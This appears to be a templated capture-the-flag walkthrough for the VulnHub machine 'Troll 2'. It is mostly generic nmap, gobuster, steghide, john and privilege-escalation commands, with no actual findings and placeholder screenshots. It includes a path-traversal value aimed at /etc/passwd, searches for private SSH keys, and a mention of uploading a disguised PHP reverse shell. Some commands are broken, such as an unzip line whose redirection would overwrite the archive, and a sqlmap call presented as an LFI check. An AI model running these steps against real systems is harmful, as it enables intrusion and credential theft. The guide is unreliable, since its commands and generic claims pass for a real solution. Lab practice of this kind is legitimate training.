# Troll 2: OSCP Walkthrough

> **Machine:** Troll 2
> **Source:** VulnHub (by 0x454f)
> **IP Address:** 192.168.x.x (DHCP)
> **OS:** Linux
> **Difficulty:** Intermediate / Hard
> **Focus:** Steganography, deep enumeration, hidden data extraction

---

## Recon

```bash
# Discover target IP
sudo netdiscover -i eth0

# Full nmap scan with service detection
nmap -sV -sC -p- 192.168.x.x

# Verbose scan with OS detection
nmap -sV -sC -O -p- 192.168.x.x
```

**Expected results:**
- Standard services on common ports
- May have non-standard ports open
- The "Troll" aspect may involve hidden services or encrypted/hidden data

---

## Enumeration

### Web Enumeration

```bash
# Check all discovered ports
nmap -sV -sC -p22,80,443,8080,8443 192.168.x.x

# Nikto web scan
nikto -h http://192.168.x.x

# Detailed directory enumeration
gobuster dir -u http://192.168.x.x -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak,old,zip,tar.gz

# Whatweb fingerprinting
whatweb http://192.168.x.x

# Check robots.txt
curl http://192.168.x.x/robots.txt
curl http://192.168.x.x/sitemap.xml
```

### Deep Directory Enumeration

```bash
# Use multiple wordlists for thorough enumeration
gobuster dir -u http://192.168.x.x -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,old,zip,tar.gz,db,sql

# Try common hidden/admin paths
gobuster dir -u http://192.168.x.x -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php,bak,old

# Check for hidden files (dot-files)
gobuster dir -u http://192.168.x.x -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt
```

### FTP / SSH Enumeration

```bash
# If FTP is open, try anonymous login
ftp 192.168.x.x
# Login as anonymous
# List all files including hidden ones
ls -la

# If SSH is open, enumerate for username hints
nmap -sV --script ssh-hostkey,ssh2-enum-algos 192.168.x.x -p 22
```

### Hidden File Discovery

```bash
# The Troll2 machine emphasizes finding hidden files/data
# Use wget or curl recursively to mirror the site
wget --mirror --convert-links --page-requisites http://192.168.x.x --reject robots.txt

# Search for hidden files locally
find . -name ".*" -type f 2>/dev/null
find . -name "*.txt" -not -name "index*" 2>/dev/null
find . -name "*.log" -o -name "*.conf.bak" 2>/dev/null
```

> **Screenshots:** See the [Screenshots](#-screenshots) section below

---

## Exploitation

### Steganography Analysis

The Troll2 machine focuses on **steganography**: hiding data within other files.

```bash
# Step 1: Find image files on the compromised web server or downloaded FTP content
find / -name "*.jpg" -o -name "*.png" -o -name "*.gif" -o -name "*.bmp" 2>/dev/null

# Step 2: Steghide: extract hidden data from JPEG images
steghide extract -sf image.jpg -p <password>
# Common default passwords: "" (empty), "password", "secret"
steghide extract -sf image.jpg

# Step 3: Outguess: another steganography tool
outguess -k <password> -r image.jpg extracted.txt
outguess -r image.jpg output.txt

# Step 4: Strings command to find readable text in binary files
strings image.jpg | grep -i "flag\|password\|secret\|key\|root"
strings image.jpg > strings_output.txt

# Step 5: Exiftool: check metadata for hidden data
exiftool image.jpg
exiftool -G image.jpg
```

### ZIP / ARCHIVE Cracking

```bash
# Find password-protected archives
find / -name "*.zip" -o -name "*.rar" -o -name "*.7z" -o -name "*.gpg" -o -name "*.enc" 2>/dev/null

# Crack zip passwords with john
zip2john protected.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Unzip after cracking
unzip -P < cracked_password > protected.zip

# Crack rar passwords
rar2john protected.rar > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Web Exploitation

```bash
# If a web application is found, attempt standard exploitation
sqlmap -u "http://192.168.x.x/page?id=1" --batch --dbs --dump

# Check for LFI vulnerability
sqlmap -u "http://192.168.x.x/page?file=../../etc/passwd" --batch

# Check for file upload vulnerabilities
# Upload a PHP reverse shell disguised as an image
```

### Manual Steganography on Downloaded Files

```bash
# If you downloaded files via wget from a hidden directory
cd downloaded_files/
for f in *.jpg *.png *.bmp; do
    echo "=== Checking $f ==="
    steghide info -sf "$f" 2>/dev/null
    strings "$f" | grep -iE "flag|password|secret|key|troll|root|token"
done
```

> **Screenshots:** See the [Screenshots](#-screenshots) section below

---

## Privesc

### User Enumeration

```bash
# List users on the system
cat /etc/passwd

# Check for non-standard users
awk -F: '$3 >= 1000 && $3 < 65534 {print $1}' /etc/passwd

# Check home directories
ls -la /home/

# Check SSH authorized_keys for other users
find /home -name "authorized_keys" 2>/dev/null
find / -name "id_rsa" -o -name "*.pem" 2>/dev/null
```

### Privilege Escalation

```bash
# Check sudo privileges
sudo -l

# Check SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check for world-writable files
find / -writable -type f 2>/dev/null | grep -v "/proc\|/sys\|/dev"

# GTFOBins check for common binaries
# python, perl, vim, less, more, find, nmap, etc.

# If you found password hashes elsewhere on the system
# Copy them and crack locally
```

### Read Root Flag

```bash
# Once root is obtained
cat /root/root.txt
```

> **Screenshots:** See the [Screenshots](#-screenshots) section below

---

## 📸 Screenshots

| Step | Screenshot |
|------|-----------|
| Nmap full port scan | *[Image: Nmap Scan]* |
| Directory enumeration (gobuster) | *[Image: Dir Enum]* |
| Nikto web scan results | *[Image: Nikto]* |
| Hidden file discovered on server | *[Image: Hidden File]* |
| Steghide extraction from image | *[Image: Steghide]* |
| Strings output revealing hidden data | *[Image: Strings]* |
| Exiftool metadata output | *[Image: Exiftool]* |
| Cracked zip/archive contents | *[Image: Zip Crack]* |
| Hidden steganographic payload decoded | *[Image: Stego Payload]* |
| Root shell / root.txt obtained | *[Image: Root Flag]* |

---

## Key Takeaways

1. **Steganography is the core skill**: `steghide`, `outguess`, `strings`, and `exiftool` are the primary tools.
2. **Deep enumeration is essential**: hidden directories and files often contain the key clues for a Troll-style box.
3. **Password-protected archives** are common: use `zip2john` / `rar2john` with `john` and `rockyou.txt`.
4. **The "troll" aspect** means the machine deliberately tries to mislead: expect red herrings and extra layers of obfuscation.
5. **Always check file metadata** with `exiftool`: hidden text or passwords are often embedded there.
6. **`strings` on binary/image files** can reveal hidden messages, credentials, or flags not visible in normal inspection.
7. **Persistence of enumeration**: the flag is often buried deep and requires patience to find.

---

*M4d3 w1th ❤️ by Ankit Patidar*

M4d3 w1th ❤️ by Ankit Patidar
